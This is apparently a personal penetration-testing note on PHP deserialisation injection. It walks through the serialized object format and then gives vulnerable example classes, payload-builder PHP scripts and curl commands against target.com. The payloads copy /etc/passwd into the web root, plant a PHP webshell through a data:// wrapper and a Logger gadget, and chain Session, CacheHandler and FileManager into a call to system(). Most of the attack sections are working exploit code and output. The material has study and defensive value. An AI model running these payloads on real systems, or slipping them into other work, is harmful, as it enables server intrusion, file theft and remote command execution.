# php-deserialisation-injection

**Author:** Julien Bongars\
**Date:** 2026-02-13 01:36:15\
**Path:**

---

**NOTE** This is more theory than practice now. Can look at ./phpgcc docs for auto use.

## PHP Objects

### Code to create object

```php
<?php

class User {
    public $username;
    public $role;

    public function __construct($username, $role) {
        $this->username = $username;
        $this->role = $role;
    }
}

$user = new User("admin", "editor");

// Serialize the object into a string
$serialized = serialize($user);
echo $serialized;
// Output: O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:6:"editor";}

// Unserialize it back into an object
$obj = unserialize($serialized);
echo $obj->username; // "admin"
```

### Create PHP Object

The serialized format is just a string. You don't need PHP to craft one — you can write it by hand or in any language.

```
O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}
```

Breakdown:

- `O:4:"User"` — Object of class "User" (4 chars in name)
- `2` — has 2 properties
- `s:8:"username"` — string property name, 8 chars
- `s:5:"admin"` — string value, 5 chars
- `s:4:"role"` — string property name, 4 chars
- `s:5:"admin"` — we changed "editor" to "admin"

When unserialised on the server, PHP maps these values onto the existing `User` class definition. You control the **property values**, the server provides the **methods**.

---

## Attack Example

### Source Code

```php
<?php
// app.php — a file backup/logging utility class

class FileBackup {
    public $source;
    public $destination;
    public $compress;

    public function __construct($source, $destination, $compress = false) {
        $this->source = $source;
        $this->destination = $destination;
        $this->compress = $compress;
    }

    public function __destruct() {
        // On cleanup, copy the backup to its destination
        // Developer uses this to ensure temp files get moved even if script errors out
        if ($this->compress) {
            $data = file_get_contents($this->source);
            file_put_contents($this->destination, gzcompress($data));
        } else {
            copy($this->source, $this->destination);
        }
    }
}

// Vulnerable entry point — app stores serialized preferences in a cookie
$prefs = unserialize(base64_decode($_COOKIE['prefs']));
```

### Build Attack Serialised Object

```php
<?php
// build-payload.php

class FileBackup {
    public $source;
    public $destination;
    public $compress;
}

// Option A: LFI — exfiltrate /etc/passwd to a web-accessible location
$lfi = new FileBackup();
$lfi->source = "/etc/passwd";
$lfi->destination = "/var/www/html/uploads/out.txt";
$lfi->compress = false;

echo "LFI payload:\n";
echo base64_encode(serialize($lfi)) . "\n\n";

// Option B: RCE — write a webshell
$rce = new FileBackup();
$rce->source = "data://text/plain,<?php system(\$_GET['cmd']); ?>";
$rce->destination = "/var/www/html/uploads/shell.php";
$rce->compress = false;

echo "RCE payload:\n";
echo base64_encode(serialize($rce)) . "\n";
```

### Curl and Output

```bash
# LFI — copy /etc/passwd to web root
curl -v --cookie "prefs=Tzo4OiJGaWxlQmFja3VwIjozOntzOjY6InNvdXJjZSI7czoxMToiL2V0Yy9wYXNzd2QiO3M6MTE6ImRlc3RpbmF0aW9uIjtzOjMzOiIvdmFyL3d3dy9odG1sL3VwbG9hZHMvb3V0LnR4dCI7czo4OiJjb21wcmVzcyI7YjowO30=" \
  http://target.com/app.php

# Read the exfiltrated file
curl http://target.com/uploads/out.txt
# root:x:0:0:root:/root:/bin/bash
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# ...

# RCE — write webshell via data:// stream wrapper then execute
curl -v --cookie "prefs=Tzo4OiJGaWxlQmFja3VwIjozOntzOjY6InNvdXJjZSI7czo0OToiZGF0YTovL3RleHQvcGxhaW4sPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+IjtzOjExOiJkZXN0aW5hdGlvbiI7czozNDoiL3Zhci93d3cvaHRtbC91cGxvYWRzL3NoZWxsLnBocCI7czo4OiJjb21wcmVzcyI7YjowO30=" \
  http://target.com/app.php

curl "http://target.com/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Gadget Chain Example

### Straight Forward Chain

A single class with a magic method that directly calls a dangerous function.

```php
<?php
// Server-side code — you find this in source code review

class Logger {
    public $logFile;
    public $logData;

    // __destruct fires when the object is garbage collected
    public function __destruct() {
        file_put_contents($this->logFile, $this->logData);
    }
}

// Somewhere in the app
$input = $_GET['data'];
$obj = unserialize($input); // vulnerable entry point
// when script ends, __destruct fires on $obj
```

```php
<?php
// build-payload.php — your local machine

class Logger {
    public $logFile;
    public $logData;
}

$payload = new Logger();
$payload->logFile = "/var/www/html/shell.php";
$payload->logData = "<?php system(\$_GET['cmd']); ?>";

echo urlencode(serialize($payload));
```

```bash
# Upload the webshell via deserialization
curl "http://target.com/vuln.php?data=O%3A6%3A%22Logger%22%3A2%3A%7Bs%3A7%3A%22logFile%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Fshell.php%22%3Bs%3A7%3A%22logData%22%3Bs%3A29%3A%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22%3B%7D"

# Then access the shell
curl "http://target.com/shell.php?cmd=whoami"
# Output: www-data
```

### More Sophisticated Chain

Multiple classes chained together — one magic method triggers a method on a controlled property, which triggers another, until you reach a dangerous sink.

```php
<?php
// Server-side classes — found via source code review

class Session {
    public $handler;

    public function __wakeup() {
        // calls close() on whatever $this->handler is
        $this->handler->close();
    }
}

class CacheHandler {
    public $store;
    public $path;

    // CacheHandler has a close() method
    public function close() {
        // calls flush() on whatever $this->store is
        $this->store->flush($this->path);
    }
}

class FileManager {
    public $callback;

    // FileManager does NOT have a flush() method
    // so __call() is triggered when flush() is called on it
    public function __call($method, $args) {
        // calls whatever is in $this->callback with the args
        call_user_func($this->callback, $args[0]);
    }
}

// Vulnerable entry point
$obj = unserialize($_COOKIE['token']);
```

```php
<?php
// build-payload.php — chain: Session → CacheHandler → FileManager → system()

class Session {
    public $handler;
}

class CacheHandler {
    public $store;
    public $path;
}

class FileManager {
    public $callback;
}

// Build the chain from the inside out

// Step 3: FileManager — the sink
// When flush() is called on this, __call triggers call_user_func("system", "id")
$fileManager = new FileManager();
$fileManager->callback = "system";

// Step 2: CacheHandler — the middle link
// close() calls $this->store->flush($this->path)
$cache = new CacheHandler();
$cache->store = $fileManager;  // flush() called on FileManager triggers __call
$cache->path = "id";           // this becomes the argument to system()

// Step 1: Session — the entry point
// __wakeup() calls $this->handler->close()
$session = new Session();
$session->handler = $cache;    // close() called on CacheHandler

echo serialize($session);
// Flow: unserialize → __wakeup → close() → flush() → __call → system("id")
```

```bash
curl -v --cookie "token=$(python3 -c 'import urllib.parse; print(urllib.parse.quote(open("payload.txt").read()))')" http://target.com/app.php

# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Dangerous Functions

See [dangerous_functions.md](./dangerous-functions.md)
